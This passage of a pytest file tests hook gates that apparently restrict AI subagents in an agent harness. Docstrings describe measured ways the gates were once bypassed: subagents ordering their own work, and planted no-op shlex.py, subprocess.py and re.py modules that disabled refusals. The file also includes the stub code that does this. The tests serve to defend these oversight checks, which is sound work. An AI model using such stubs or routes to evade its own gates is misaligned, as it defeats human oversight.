    "python scripts/harness.py create-task --product-requirement PR-0001 --type impl",
    "python -B scripts/harness.py create-task --assigned-role backend-developer",
    "python scripts/harness.py capture TSK",
    "python scripts/harness.py dispatch TSK-0001",
    "cd scripts && python harness.py dispatch TSK-0001",
    "./scripts/harness.py create-task --type impl",
)
# What a specialist really runs. Every one of these is measured, not guessed: they are the
# subcommands the shipped role texts name (`evidence`, `submit-result`, `validate`, `--help`) plus
# the two shapes a bare-word rule would have got wrong — a role READING about a command, and the
# non-TSK capture that shares the subcommand with the refused one.
_ORDERING_ALLOWED = (
    "python scripts/harness.py submit-result --task-id TSK-0001 --role backend-developer",
    "python scripts/harness.py evidence --kind test --result pass --related TSK-0001",
    "python scripts/harness.py capture EVD",
    "python scripts/harness.py validate",
    "python scripts/harness.py doctor",
    "python scripts/harness.py --help",
    "grep -rn create-task docs/",
    "cat scripts/harness.py",
)


# The second class of rule 4 (L40): commands that REINSTALL the enforcement layer. The last two
# are the spellings a rule written on the plain word would miss -- the entry point reached after a
# `cd`, and the module form of the same CLI.
_INSTALLING_REFUSED = (
    "python scripts/harness.py set-preset team",
    "python scripts/harness.py update-kit",
    "cd scripts && python harness.py update-kit",
    "python -m kernel.cli set-preset core",
)
# What a subagent may still run around such a change, and it is the RESIDUE this round names
# rather than closes: opening the approval QUESTION orders nothing and installs nothing -- the
# user mints by answering it, so the content stays theirs. See the test that owns this tuple.
_INSTALL_APPROVAL_ALLOWED = (
    "python scripts/harness.py request-approval preset --preset team",
    "python scripts/harness.py request-approval kit_update",
)


@pytest.mark.parametrize("command", _INSTALLING_REFUSED)
def test_a_subagent_cannot_run_the_harness_commands_that_install_enforcement(tmp_path, command):
    """L40, closed for the class rather than for the two names in it: a specialist may not start
    the kit's installer, which rewrites the hooks, the settings and the role set the session is
    judged by.

    Measured red before this (verifiers of TSK-0064 and TSK-0067, real hook processes against a
    scaffolded project): as a subagent, `set-preset` and `update-kit` passed ALL eight registered
    `Bash|PowerShell` gates while `create-task` was rc 2 for the same caller -- rule 4 knew only
    the class "orders work", and neither of these orders anything. What the subagent controlled
    was the TIMING of a user-signed change (and, for `set-preset`, its repetition).

    The class is derived, not named:
    `test_the_installing_commands_are_the_cli_routes_to_the_installer`.
    """
    _state, _task = bound_repo(tmp_path)
    result = run_scope(tmp_path, dict(shell_payload(tmp_path, command), agent_id="child-1"))
    assert result.returncode == 2, result.stdout + result.stderr
    assert "REINSTALLS THE ENFORCEMENT LAYER" in result.stderr, result.stderr


@pytest.mark.parametrize("command", _INSTALL_APPROVAL_ALLOWED)
def test_asking_the_user_for_an_install_approval_is_the_named_residue(tmp_path, command):
    """THE TRIPWIRE ON THE LIMIT, in both directions. `request-approval` prints the question the
    USER answers; no command mints, so a subagent that opens one has changed nothing yet and this
    rule leaves it alone -- which is why L40's judgement is "the authorisation is the user's APR".

    If a later round decides the QUESTION is the lead's act too, this test goes red and the
    sentence above has to move with the code instead of quietly outliving it.
    """
    _state, _task = bound_repo(tmp_path)
    result = run_scope(tmp_path, dict(shell_payload(tmp_path, command), agent_id="child-1"))
    assert result.returncode == 0, result.stdout + result.stderr


@pytest.mark.parametrize("command", _ORDERING_REFUSED)
def test_a_subagent_cannot_run_the_harness_commands_that_order_work(tmp_path, command):
    """The DELEGATE/ROUTE row of every kit's work loop — the lead creates the `TSK` before the
    spawn, never the executor — made true for the surface a role actually uses.

    Measured red before this: every one of these command lines exited 0 from a subagent's shell —
    `handle_shell` refuses on what a line NAMES, and none of them names `project_memory` or the
    enforcement layer. So a specialist could mint the work order and the lease for a second
    specialist, which is the first half of authorising itself.

    What this does NOT claim is in the module docstring of the gate: a script the agent writes
    into its own `allowed_scope` and then runs reaches the same kernel functions.
    """
    _state, _task = bound_repo(tmp_path)
    result = run_scope(tmp_path, dict(shell_payload(tmp_path, command), agent_id="child-1"))
    assert result.returncode == 2, result.stdout + result.stderr
    assert "ORDERS work" in result.stderr, result.stderr


@pytest.mark.parametrize("identity", _SESSION_INSTANCE_SHAPES,
                         ids=["fields-absent", "fields-null"])
@pytest.mark.parametrize("command",
                         _ORDERING_ALLOWED + _ORDERING_REFUSED + _INSTALLING_REFUSED
                         + _INSTALL_APPROVAL_ALLOWED)
def test_the_orchestrator_is_not_caught_by_the_ordering_rule(tmp_path, command, identity):
    """The anti-lockout control, and it covers BOTH refused batteries too: the same lines from the
    session instance must pass, or rule 4 has just taken the ordering commands — or the kit
    update — away from the only role that has them.

    BOTH parent payload shapes, for the reason the spawn test states — the identity fields have
    been seen absent and present-as-null, and only the null one distinguishes a truthiness test
    from a key-presence test. Without this dimension the shell path had no case that could tell
    the two apart, and the whole rule rests on that distinction."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, dict(shell_payload(tmp_path, command), **identity))
    assert result.returncode == 0, result.stdout + result.stderr


@pytest.mark.parametrize("command", _ORDERING_ALLOWED)
def test_a_subagents_own_harness_commands_still_run(tmp_path, command):
    """The false-alarm half. `submit-result` and `evidence` are what a specialist hands its work
    back with; refusing either would replace one dead end with another. `capture EVD` and
    `grep create-task` are the two shapes a rule written on bare words gets wrong."""
    _state, _task = bound_repo(tmp_path)
    result = run_scope(tmp_path, dict(shell_payload(tmp_path, command), agent_id="child-1"))
    assert result.returncode == 0, result.stdout + result.stderr


def _gate_constant(kit, name):
    """A module-level constant of the SHIPPED gate, read from its AST.

    Parsed, not imported: the hook opens with GATE_PREAMBLE and wants an installed bundle around
    it, and parsed, not grepped: a regex over the file would pass on the same name inside a
    docstring.
    """
    path = os.path.join(TEAM_KITS, kit, "hooks", "gate_write_scope.py")
    with io.open(path, encoding="utf-8") as handle:
        tree = ast.parse(handle.read(), path)
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
                isinstance(t, ast.Name) and t.id == name for t in node.targets):
            return ast.literal_eval(node.value)
    raise AssertionError("%s defines no %s" % (path, name))


def _functions_by_name(tree):
    """Every function DEFINED in this module, by name -- the call-graph nodes a branch may jump to."""
    return {node.name: node for node in ast.walk(tree)
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))}


def _reaches_producer(node, module, producers, trees, functions, seen):
    """Does `node` reach one of `producers`, following calls into helper functions?

    TRANSITIVE, WITH CYCLE PROTECTION (BUG-0006, the class of review round 2's B7). A check that
    stopped at the first hop read a branch reaching a producer only THROUGH a helper as not
    reaching it at all -- and for the maps this derivation pins, that silence removes a command
    from rule 4, which then stops refusing it for a subagent. A producer call is a `Call` whose
    func names one of `producers` (as `x.create_task` or a bare `create_task`).

    ACROSS MODULES, not only inside one: `set-preset` and `update-kit` take their effect from
    `presets.installer_command`, and `cli.py` reaches it only through `presets.apply` /
    `kitupdate.apply` -- a module-local walk answers "no route" for both and the enforcement class
    is empty. So a `Call` on `<module>.<name>` is followed when `<module>` is a module of the same
    package (that is the import shape `kernel/*.py` uses throughout: `from . import presets`).
    `seen` holds (module, function) pairs already entered, so a self-, mutually- or
    cross-module-recursive helper terminates instead of looping forever.
    """
    for inner in ast.walk(node):
        if not isinstance(inner, ast.Call):
            continue
        func = inner.func
        if isinstance(func, ast.Attribute):
            if func.attr in producers:
                return True
            owner = func.value
            if isinstance(owner, ast.Name) and owner.id in trees:
                target = functions[owner.id].get(func.attr)
                if target is not None and (owner.id, func.attr) not in seen:
                    seen.add((owner.id, func.attr))
                    if _reaches_producer(target, owner.id, producers, trees, functions, seen):
                        return True
        elif isinstance(func, ast.Name):
            if func.id in producers:
                return True
            target = functions[module].get(func.id)
            if target is not None and (module, func.id) not in seen:
                seen.add((module, func.id))
                if _reaches_producer(target, module, producers, trees, functions, seen):
                    return True
    return False


def _branch_command(test, trees):
    """The subcommand an `if args.command == ...` branch belongs to, or None.

    THE VALUE, not the spelling of the comparator: `cli.py` writes one of these branches as
    `args.command == kitupdate.COMMAND`, and a reader that only accepted a literal dropped
    `update-kit` from every derivation over it -- silently, which for a rule-4 map means the class
    goes green one command short. A module attribute is therefore resolved against that module's
    own constant.
    """
    if not (isinstance(test, ast.Compare) and len(test.ops) == 1
            and isinstance(test.ops[0], ast.Eq)
            and isinstance(test.left, ast.Attribute) and test.left.attr == "command"
            and isinstance(test.left.value, ast.Name) and test.left.value.id == "args"):
        return None
    right = test.comparators[0]
    if isinstance(right, ast.Constant):
        return right.value
    if (isinstance(right, ast.Attribute) and isinstance(right.value, ast.Name)
            and right.value.id in trees):
        for node in trees[right.value.id].body:
            if isinstance(node, ast.Assign) and any(
                    isinstance(target, ast.Name) and target.id == right.attr
                    for target in node.targets):
                return ast.literal_eval(node.value)
    return None


def _commands_reaching(trees, producers, entry="cli"):
    """The `args.command` values whose branch in `trees[entry]` reaches one of `producers`.

    Takes the parsed package rather than one source string, so the resolution can be measured
    against constructed modules (a branch that reaches a producer only via a helper, or only via
    another module) rather than only against whatever `cli.py` happens to route directly today.
    """
    functions = {name: _functions_by_name(tree) for name, tree in trees.items()}
    found = set()
    for node in ast.walk(trees[entry]):
        if not isinstance(node, ast.If):
            continue
        command = _branch_command(node.test, trees)
        if command is None:
            continue
        # each branch gets its OWN `seen` -- one command's helper walk must not suppress another's
        if any(_reaches_producer(stmt, entry, producers, trees, functions, set())
               for stmt in node.body):
            found.add(command)
    return found


def _kernel_trees():
    """Every module of the SHIPPED kernel package, parsed -- the call graph the CLI routes into."""
    trees = {}
    directory = os.path.join(TEAM_KITS, "kernel")
    for name in sorted(os.listdir(directory)):
        if not name.endswith(".py"):
            continue
        path = os.path.join(directory, name)
        with io.open(path, encoding="utf-8") as handle:
            trees[name[:-3]] = ast.parse(handle.read(), path)
    return trees


def _cli_commands_reaching(producers):
    """The `args.command` values whose branch in `kernel/cli.py` reaches one of `producers`.

    THE DERIVATION, so a gate's map cannot be a tuple that was true once. Which CLI subcommands
    reach a given kernel producer is a fact of the kernel and is read out of it here -- at ANY
    call depth and through any of its modules, so neither a refactor that routes a command through
    a helper nor one that moves the producer into another module can make this fall silent (see
    `_reaches_producer`).
    """
    return _commands_reaching(_kernel_trees(), producers)


@pytest.mark.parametrize("kit", KITS)
def test_the_ordering_commands_are_the_cli_routes_to_the_task_producers(kit):
    """`_ORDERING_COMMANDS` IS the set of CLI subcommands that reach `dispatch.create_task` or
    `dispatch.create_lease` — asserted against `kernel/cli.py`, not against a memory of it.

    This is what keeps rule 4 from being the next stale tuple: a fourth route to either producer
    turns this red on the day it ships, and an entry here that reaches neither is red too. The
    NARROWING inside a route (`capture` orders only for `TSK`) is the map's value and is measured
    behaviourally by `test_a_subagents_own_harness_commands_still_run` (`capture EVD` passes).
    """
    routes = _cli_commands_reaching({"create_task", "create_lease"})
    assert routes, "the derivation found no route at all — cli.py's shape changed, not the gate's"
    assert set(_gate_constant(kit, "_ORDERING_COMMANDS")) == routes, (
        "%s: gate_write_scope orders on %s, kernel/cli.py routes to the task producers through %s"
        % (kit, sorted(_gate_constant(kit, "_ORDERING_COMMANDS")), sorted(routes)))


# A module whose ordering branches reach the producer at THREE depths -- direct, one hop, two
# hops -- plus a branch that reaches it only through a CYCLE (must terminate, must not count) and
# an innocent branch that reaches no producer at all. The direct-only predecessor of
# `_reaches_producer` returned only {"direct"} for this source.
_CLI_WITH_HELPER_HOPS = '''
def _order(state, args):
    return dispatch.create_task(state, {})

def _relay(state, args):
    return _order(state, args)

def _loop(state, args):
    return _loop(state, args)          # self-recursive: cycle protection must terminate this

def main(args, state):
    if args.command == "direct":
        dispatch.create_task(state, {})
    if args.command == "one-hop":
        _order(state, args)
    if args.command == "two-hops":
        _relay(state, args)
    if args.command == "cyclic":
        _loop(state, args)
    if args.command == "innocent":
        state.capture("EVD", {})
'''


def test_the_route_derivation_follows_helper_hops_with_cycle_protection():
    """BUG-0006: the derivation that pins `_ORDERING_COMMANDS` must find an ordering branch at ANY
    call depth. If `cli.py` is refactored to route `create-task` through a helper, a direct-only
    scan drops it; the pin then goes green on a SMALLER set, `_ORDERING_COMMANDS` is "corrected"
    down to match, and rule 4 stops refusing that ordering command for a subagent -- the exact hole
    rule 4 exists to close, reopened by a green test.

    RED WITHOUT THE FIX: the first cut of `_reaches_producer` walked only the branch body for a
    direct producer call, so this returns {"direct"} -- "one-hop" and "two-hops" are missing. The
    cyclic branch reaches no producer and must be ABSENT (and must not hang), and the innocent one
    must be absent too, so the assertion also fails if the walk over-counts.
    """
    found = _commands_reaching({"cli": ast.parse(_CLI_WITH_HELPER_HOPS, "<cli-with-hops>")},
                               {"create_task", "create_lease"})
    assert found == {"direct", "one-hop", "two-hops"}, found


# The two shapes `set-preset` and `update-kit` really have in `kernel/cli.py`, reduced to their
# skeleton: the producer sits in ANOTHER module and the branch is reached through that module's
# `apply`, and one of the two branches compares against a module CONSTANT rather than a literal.
_CLI_ACROSS_MODULES = '''
def main(args, state):
    if args.command == "installs":
        presets.apply(state, args.preset)
    if args.command == installer.COMMAND:
        installer.apply(state)
    if args.command == "innocent":
        presets.record_preset(state, args.preset)
'''
_MODULE_WITH_THE_PRODUCER = '''
COMMAND = "update-kit"

def installer_command(kit):
    return ["scaffold", kit]

def apply(state, preset=None):
    return _run(installer_command(state.kit))

def _run(command):
    return command

def record_preset(state, preset):
    return preset
'''


def test_the_route_derivation_crosses_modules_and_resolves_a_constant_comparator():
    """The two things the ENFORCEMENT class needs that the ordering class never did, both measured
    on a constructed package instead of on whatever `cli.py` looks like today.

    RED WITHOUT THE FIX, each half on its own: a module-LOCAL walk answers "reaches nothing" for
    both branches, because the producer is `presets.installer_command` and `cli.py` only ever
    calls `presets.apply` -- the derived class comes out EMPTY and the pin below would then demand
    an empty `_INSTALLING_COMMANDS`, i.e. the rule switched off by a green test. And a comparator
    reader that accepts only `ast.Constant` drops the `installer.COMMAND` branch, which is exactly
    how `update-kit` is written in the shipped CLI -- the class would come out one command short,
    which is the state L40 measured.

    The `innocent` branch is the over-count control: it calls into the same module and reaches no
    producer, so it must be absent.
    """
    trees = {"cli": ast.parse(_CLI_ACROSS_MODULES, "<cli-across>"),
             "presets": ast.parse(_MODULE_WITH_THE_PRODUCER, "<producer>"),
             "installer": ast.parse(_MODULE_WITH_THE_PRODUCER, "<producer>")}
    found = _commands_reaching(trees, {"installer_command"})
    assert found == {"installs", "update-kit"}, found


@pytest.mark.parametrize("kit", KITS)
def test_the_installing_commands_are_the_cli_routes_to_the_installer(kit):
    """`_INSTALLING_COMMANDS` IS the set of CLI subcommands that reach `presets.installer_command`
    — the second derived class of rule 4 (L40), asserted against the kernel and not against a
    memory of it.

    WHY THAT PRODUCER: a command "installs the enforcement layer" when it starts the kit's
    installer, and the kernel builds that invocation in exactly one place; `presets.apply` and
    `kitupdate.apply` both hand its result to a child process. So a third command with the same
    effect joins this class the day it ships, and an entry here that starts no installer is red —
    which is the property L40 asks for instead of the two names it measured.

    What the derivation cannot see is the same boundary `_ORDERING_COMMANDS` has: a command that
    shelled out to the scaffold itself instead of asking the kernel for the invocation.
    """
    routes = _cli_commands_reaching({"installer_command"})
    assert routes, "the derivation found no route at all — the kernel's shape changed, not the gate's"
    assert set(_gate_constant(kit, "_INSTALLING_COMMANDS")) == routes, (
        "%s: gate_write_scope reserves %s to the lead, the kernel routes to the installer through %s"
        % (kit, sorted(_gate_constant(kit, "_INSTALLING_COMMANDS")), sorted(routes)))


def test_the_two_derived_classes_of_rule_4_stay_disjoint():
    """One command, one reason — otherwise a refusal names a property the command does not have.

    Not a taste rule: `_reserved_command` is asked once per class and the FIRST match wins, so an
    overlap would silently decide which of two messages a role reads. Both maps are derived, so
    this is a statement about the KERNEL: nothing that orders work installs enforcement today.
    """
    ordering = _cli_commands_reaching({"create_task", "create_lease"})
    installing = _cli_commands_reaching({"installer_command"})
    assert ordering and installing and not (ordering & installing), (sorted(ordering),
                                                                     sorted(installing))


@pytest.mark.parametrize("kit", KITS)
def test_the_gate_knows_the_entry_point_the_kernel_installs(kit):
    """The other half a hand-typed constant could get wrong: rule 4 only ever fires on a line that
    names the harness, so a stale file name would switch the whole rule off silently."""
    from kernel import cli
    assert _gate_constant(kit, "_HARNESS_SCRIPT") == os.path.basename(cli.ENTRY_POINT)
    assert _gate_constant(kit, "_KERNEL_CLI_MODULE") == "%s.%s" % (
        cli.__name__.split(".")[0], cli.__name__.split(".")[-1])


# -- BUG-0013: a kit hook must not resolve a stdlib name from an agent-writable directory --------
#
# A module that returns _Anything() for EVERY attribute access when it is imported and NOTHING else.
# It stands in for a stdlib module without breaking the import machinery that pulls it in (a stub
# that merely raised would surface as an import error and fail-closed for the wrong reason). Same
# shape `.claude/hooks/test_gates.py::SILENT_MODULE` uses for the same measurement.
_SILENT_STDLIB_STUB = (
    "class _Anything(object):\n"
    "    def __call__(self, *a, **k): return _Anything()\n"
    "    def __getattr__(self, name): return _Anything()\n"
    "    def __setattr__(self, name, value): pass\n"
    "    def __iter__(self): return iter(())\n"
    "    def __bool__(self): return False\n"
    "    def __str__(self): return ''\n"
    "class _Module(object):\n"
    "    def __getattr__(self, name): return _Anything()\n"
    "import sys as _sys\n"
    "_sys.modules[__name__] = _Module()\n"
)


def test_a_planted_stdlib_module_cannot_disable_the_kit_gate(tmp_path):
    """BUG-0013: a file NAMED like a standard-library module, planted in the kit hooks directory the
    gate preamble puts at sys.path[0].

    Measured 2026-08-05, and again here: a no-op `shlex.py` there answered `import shlex` for the
    gate's tokeniser (imported AFTER `import _kernel`), which then returned no tokens; gate 1 saw an
    empty pipeline and allowed `sed -i` into `team-kits/kernel/state.py`. `_kernel`'s
    `_StandardLibraryWins`, installed while `_kernel` loads, resolves every name the interpreter
    calls standard library from the standard library instead of from the guarded directory.

    THE SUBJECT RUNS AS A REAL PROCESS -- an in-process import would already hold the real `shlex`
    in `sys.modules`, so the plant could never win and the test could never fail. Red without the
    fix (guard install removed in an external clone): the same plant flips this to rc 0, which is
    what makes the assertion measure the finder rather than the path check that stands behind it.
    """
    hooks = tmp_path / "hooks"
    shutil.copytree(HOOKS, str(hooks))
    (hooks / "shlex.py").write_text(_SILENT_STDLIB_STUB, encoding="utf-8")
    payload = json.dumps(shell_payload(tmp_path, "sed -i s/a/b/ team-kits/kernel/state.py"))
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    proc = subprocess.run([sys.executable, str(hooks / "gate_write_scope.py")],
                          input=payload, capture_output=True, text=True, env=env, timeout=120)
    assert proc.returncode == 2, (
        "a shlex.py planted in the kit hooks directory disabled gate 1's tokeniser: rc=%d %s"
        % (proc.returncode, proc.stderr[:400]))
    assert "enforcement layer" in proc.stderr, (
        "refused, but not for naming the enforcement layer -- the plant took the decision "
        "elsewhere, so this run does not prove the finder held: %s" % proc.stderr[:400])


# A module that RECORDS that it was imported and then answers a subprocess call as "green". The
# marker is the measurement: a planted file that is never imported cannot decide anything, and an
# exit code alone does not say which of the two happened.
_MARKING_SUBPROCESS = (
    "import os\n"
    "open(%r, 'a').close()\n"
    "class _Result(object):\n"
    "    returncode = 0\n"
    "    stdout = ''\n"
    "    stderr = ''\n"
    "def run(*a, **k): return _Result()\n"
    "def check_output(*a, **k): return ''\n"
    "class TimeoutExpired(Exception): pass\n"
    "class SubprocessError(Exception): pass\n"
    "DEVNULL = -3\nPIPE = -1\nSTDOUT = -2\n"
)


def _launched(hooks, project, gate, payload, timeout=300):
    """Run a gate the way the REGISTRATION does — through `_gate.py` — as a real process."""
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(project))
    env.pop("HARNESS_KERNEL_PATH", None)
    proc = subprocess.run([sys.executable, "-B", os.path.join(str(hooks), "_gate.py"), gate],
                          input=json.dumps(payload), capture_output=True, text=True,
                          env=env, timeout=timeout)
    return proc.returncode, proc.stderr or ""


def _kit_project(tmp_path, name):
    """A project carrying this kit's hooks at `.claude/hooks`, outside the repo tree."""
    project = tmp_path / name
    hooks = project / ".claude" / "hooks"
    shutil.copytree(HOOKS, str(hooks))
    return project, hooks


def test_a_planted_stdlib_module_cannot_disable_a_launched_gate(tmp_path):
    """BUG-0013, the half the `_kernel` guard did not reach: a gate that never imports `_kernel`.

    `gate_pipeline` is the DoD teeth — it RUNS `scripts/quality.py` and blocks a red one — and it
    reaches `subprocess` on its own (`gate_pipeline.py:22`), as do `gate_test_coverage`,
    `guard_no_adhoc`, `guard_question_context` and `guard_guidelines` for `re`. Measured
    2026-08-11 through the real launcher with a no-op `subprocess.py` planted beside the hooks: the
    gate read a RED pipeline as green and allowed `git push`, rc 0, no stderr.

    THE GUARD THEREFORE SITS IN THE LAUNCHER (`_gate.py`), which every registered enforcement hook
    of this kit runs behind — a property of the registration rather than of a set of gate names.
    `test_every_refusal_capable_registered_hook_runs_through_the_launcher` is the other half of
    that claim.

    RED WITHOUT THE FIX: removing the `_stdlib_guard.install` line from `_gate.py` in an external
    clone flips this to rc 0 with the marker written (measured). Both are asserted, because the
    marker is what separates "the plant lost" from "the plant never ran".
    """
    project, hooks = _kit_project(tmp_path, "launched-gate")
    (project / "project_memory" / "product" / "active").mkdir(parents=True)
    (project / "project_memory" / "product" / "active" / "PR-0001.yaml").write_text(
        "id: PR-0001\n", encoding="utf-8")
    (project / "scripts").mkdir()
    (project / "scripts" / "quality.py").write_text(
        "import sys\nprint('FAIL: the pipeline is red')\nsys.exit(1)\n", encoding="utf-8")
    marker = str(tmp_path / "planted-subprocess-ran")
    (hooks / "subprocess.py").write_text(_MARKING_SUBPROCESS % marker, encoding="utf-8")

    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(project),
               "tool_input": {"command": "git push origin main"}}
    rc, err = _launched(hooks, project, "gate_pipeline.py", payload)
    assert not os.path.exists(marker), (
        "a subprocess.py planted beside the hooks answered for gate_pipeline — that module is what "
        "RUNS the quality pipeline whose exit code the merge/push block is made of")
    assert rc == 2, (
        "the DoD teeth were disarmed by a planted module: a RED quality pipeline was allowed "
        "through (rc=%d) %s" % (rc, err[:400]))
    assert "quality pipeline is RED" in err, (
        "refused, but not for the red pipeline — the plant moved the decision elsewhere: %s"
        % err[:400])


def test_a_planted_stdlib_module_cannot_take_over_a_launched_guards_decision(tmp_path):
    """The same property for a `_compat.stop` guard, and here the EXIT CODE IS NOT THE SUBJECT.

    Measured 2026-08-11 with `re.py` planted and the launcher guard removed: the process still ends
    in rc 2 — but from the launcher's own catch-all (`guard_no_adhoc.py failed while running
    (TypeError…)`), not from the guard's judgement. An exit-code-only assertion would therefore be
    GREEN without the fix, which is why this asserts the REASON. With the guard the same run
    produces the guard's own refusal.

    The subject is rule 2 of `guard_no_adhoc` (a file named after an item id), which is the branch
    `re` decides; the path is under `docs/` so that neither the fnmatch rule nor the loose-root-doc
    rule can answer instead and mask the measurement.
    """
    project, hooks = _kit_project(tmp_path, "launched-guard")
    (project / "docs").mkdir(parents=True)
    (hooks / "re.py").write_text(_SILENT_STDLIB_STUB, encoding="utf-8")

    payload = {"hook_event_name": "PreToolUse", "tool_name": "Write", "cwd": str(project),
               "tool_input": {"file_path": str(project / "docs" / "PR-0002_notes.md"),
                              "content": "x"}}
    rc, err = _launched(hooks, project, "guard_no_adhoc.py", payload)
    assert rc == 2, "a planted re.py let an item-named document through: %s" % err[:400]
    assert "Blocked creating" in err, (
        "rc 2, but not from the guard: the planted module crashed it into the launcher's catch-all "
        "instead of losing to the standard library — %s" % err[:400])


def _refuses(path):
    """Does this hook FILE call a NO-RETURN REFUSAL? — parsed as a property, never grepped.

    The property, not a two-construct list: a hook refuses when it calls something that ends the
    process with a blocking code. That is
      * `_compat.stop(...)` — the funnel every refusal goes through — or `_kernel.block(...)`,
        which itself calls `stop`/`os._exit(2)`; either as an attribute or under an import alias
        (`from _compat import stop as s`);
      * `sys.exit(...)` or `os._exit(...)` — attribute or aliased — with an argument that is NOT a
        literal 0/None. A literal 0 is "allow"; a literal non-zero is a refusal; a NON-literal
        (`sys.exit(status)`) is treated as a refusal because it can be 2, which is the fail-closed
        direction for a tripwire (over-including a hook only demands it run behind the launcher).
    The predecessor enumerated exactly `_compat.stop` (unaliased) and a literal `sys.exit(2)`, so a
    gate refusing via `os._exit(2)`, `sys.exit(<var>)` or an aliased `stop` would have read as
    non-refusing and run unguarded. Measured over the shipped tree, this property still splits the
    enforcement hooks from the comfort hooks (`session_status`, `kit_trust_state`,
    `clear_handover_marker`, `notify_agent_events`, `format_on_write`), which exit only on a literal
    0 — the `os._exit(2)` in `session_status` is in a COMMENT, which the parse does not see.

    THE RESIDUAL, named rather than claimed away: a refusal reached FULLY DYNAMICALLY —
    `raise SystemExit(2)`, `getattr(_compat, "stop")(...)`, or a callable stored in a variable and
    called — is not recognised. No shipped hook does any of these (measured 2026-08-11); the day one
    does, this reader needs the new shape, and the launcher test it feeds would go quietly green for
    that hook.
    """
    with io.open(path, encoding="utf-8") as handle:
        tree = ast.parse(handle.read(), path)
    # names bound to an always-refusing callable, and names bound to an exit callable, via
    # `from <mod> import <name> [as <alias>]`
    stop_aliases, exit_aliases = set(), set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.ImportFrom):
            continue
        if node.module == "_compat":
            stop_aliases |= {a.asname or a.name for a in node.names if a.name == "stop"}
        elif node.module == "_kernel":
            stop_aliases |= {a.asname or a.name for a in node.names if a.name == "block"}
        elif node.module in ("sys", "os"):
            exit_aliases |= {a.asname or a.name for a in node.names if a.name in ("exit", "_exit")}

    def _is_always_refusal(func):
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            return ((func.value.id == "_compat" and func.attr == "stop")
                    or (func.value.id == "_kernel" and func.attr == "block"))
        return isinstance(func, ast.Name) and func.id in stop_aliases

    def _is_exit_call(func):
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            return ((func.value.id == "sys" and func.attr == "exit")
                    or (func.value.id == "os" and func.attr == "_exit"))
        return isinstance(func, ast.Name) and func.id in exit_aliases

    def _exit_refuses(call):
        if not _is_exit_call(call.func):
            return False
        if not call.args:               # exit() == exit(None) == 0 == allow
            return False
        arg = call.args[0]
        if isinstance(arg, ast.Constant) and arg.value in (0, None):
            return False                # a literal allow; anything else can be a 2
        return True

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        if _is_always_refusal(node.func) or _exit_refuses(node):
            return True
    return False


def test_refuses_recognises_a_no_return_refusal_beyond_the_two_literal_forms(tmp_path):
    """`_refuses` must read the PROPERTY "calls a no-return refusal", not two spellings of it.

    RED WITHOUT THE FIX: the predecessor recognised only `_compat.stop` (unaliased) and a literal
    `sys.exit(2)`. Each variant below refuses, and each was invisible to it — so a gate written any
    of these ways would have read as non-refusing and been allowed to run off the launcher,
    unguarded. The allow forms must stay non-refusing, or the launcher tripwire would start
    demanding the launcher for a comfort hook.
    """
    refusing = {
        "os_exit": "import os\ndef main():\n    os._exit(2)\n",
        "exit_variable": "import sys\ndef main():\n    code = 2\n    sys.exit(code)\n",
        "exit_literal_nonzero": "import sys\nsys.exit(2)\n",
        "aliased_stop": "from _compat import stop as s\ndef main():\n    s('x', 'PreToolUse')\n",
        "aliased_exit": "from sys import exit as bail\ndef main():\n    bail(2)\n",
        "kernel_block": "import _kernel\ndef main():\n    _kernel.block('h', 'm')\n",
        "compat_stop": "import _compat\ndef main():\n    _compat.stop('x', 'PreToolUse')\n",
    }
    for name, src in refusing.items():
        target = tmp_path / (name + ".py")
        target.write_text(src, encoding="utf-8")
        assert _refuses(str(target)), "%s reads as non-refusing" % name
    allowing = {
        "exit_zero": "import sys\nsys.exit(0)\n",
        "exit_none": "import sys\nsys.exit()\n",
        "no_exit": "from _compat import run_captured\ndef main():\n    run_captured(['git'])\n",
    }
    for name, src in allowing.items():
        target = tmp_path / ("ok_" + name + ".py")
        target.write_text(src, encoding="utf-8")
        assert not _refuses(str(target)), "%s wrongly reads as refusing" % name


@pytest.mark.parametrize("kit", KITS)
def test_every_refusal_capable_registered_hook_runs_through_the_launcher(kit):
    """BUG-0013's tripwire, and it is fastened to the REGISTRATION rather than to a set of gates.

    The standard-library guard is installed by `_gate.py` (and again by `_kernel`, for a direct
    run). A hook that can REFUSE but is registered to run WITHOUT the launcher would therefore
    resolve `re`, `subprocess` and every other standard-library name out of the hooks directory —
    which is the measured hole: a no-op `subprocess.py` made `gate_pipeline` allow a red push.

    So the property is: whatever a shipped registration starts, if the file it starts can produce
    the block code, the command that starts it also runs the launcher. Every half is derived —
    `_refuses` PARSES the hook, `_registered_commands` reads both registration surfaces as data,
    and `_scripts_in` says which files a command names. A new gate wired directly turns this red on
    the day it ships; so does an existing one moved off the launcher.

    The comfort hooks are not exempted by name: they simply carry neither refusal construct, which
    is what `_refuses` asks. `format_on_write` and the three SessionStart hooks are registered
    WITHOUT the launcher today and pass for that reason — if one of them ever grew a refusal, this
    test would demand the launcher for it too, which is the correct demand.
    """
    hooks_dir = os.path.join(TEAM_KITS, kit, "hooks")
    checked = set()
    for _event, _matcher, command in _registered_commands(kit):
        scripts = _scripts_in(command)
        for name in scripts:
            path = os.path.join(hooks_dir, name)
            if not os.path.isfile(path) or not _refuses(path):
                continue
            checked.add(name)
            assert GATE_LAUNCHER in scripts, (
                "%s/%s can refuse (it reaches the block code) but its registration starts it "
                "without %s, so nothing installs the standard-library guard for it: %r"
                % (kit, name, GATE_LAUNCHER, command))
    assert checked, "%s: no refusal-capable hook was found in any registration — the derivation " \
                    "broke, not the wiring" % kit


def test_no_kit_module_is_named_after_a_standard_library_module():
    """The other end of `_kernel._StandardLibraryWins`, and the one that would break work rather
    than let it through: the finder answers for EVERY name the interpreter calls standard library,
    so a kit hooks directory that ever shipped `queue.py` or `types.py` would find its own module
    replaced by the standard one. BUG-0013 measured 0 collisions over the shipped names; this
    re-measures it and turns red the day one appears -- the day the finder needs a narrower
    question. Only the directories the finder actually guards are checked: the kit HOOKS trees, the
